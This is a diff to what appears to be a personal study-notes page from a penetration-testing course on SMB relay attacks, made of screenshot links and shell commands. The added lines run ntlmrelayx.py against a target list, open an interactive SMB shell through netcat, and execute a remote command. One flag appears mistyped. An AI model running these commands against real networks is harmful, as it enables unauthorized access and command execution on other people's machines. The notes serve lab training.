@@ -28,28 +28,33 @@ sudo responder -I eth0
 <img src="https://github.com/Nisha318/Nisha318.github.io/blob/master/assets/images/tcm-academy/smb-relay-6.png">
 
 ```bash
-sudo responder -I eth0 
+sudo python3 ntlmrelayx.py -smb2support -tf targets.txt 
 ```
 <img src="https://github.com/Nisha318/Nisha318.github.io/blob/master/assets/images/tcm-academy/smb-relay-7.png">
 
 <img src="https://github.com/Nisha318/Nisha318.github.io/blob/master/assets/images/tcm-academy/smb-relay-8.png">
 
-```bash
-sudo responder -I eth0 
-```
+
 
 <img src="https://github.com/Nisha318/Nisha318.github.io/blob/master/assets/images/tcm-academy/smb-relay-9.png">
 
 <img src="https://github.com/Nisha318/Nisha318.github.io/blob/master/assets/images/tcm-academy/smb-relay-10.png">
 
 ```bash
-sudo responder -I eth0 
+sudo ntlmrelayx.py -tf targets.txt -smbsupport -i
 ```
 
 <img src="https://github.com/Nisha318/Nisha318.github.io/blob/master/assets/images/tcm-academy/smb-relay-11.png">
 
+```bash
+nc 127.0.0.1 11001
+```
+
 <img src="https://github.com/Nisha318/Nisha318.github.io/blob/master/assets/images/tcm-academy/smb-relay-12.png">
 
+```bash
+ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
+```
 
 <img src="https://github.com/Nisha318/Nisha318.github.io/blob/master/assets/images/tcm-academy/smb-relay-13.png">
 
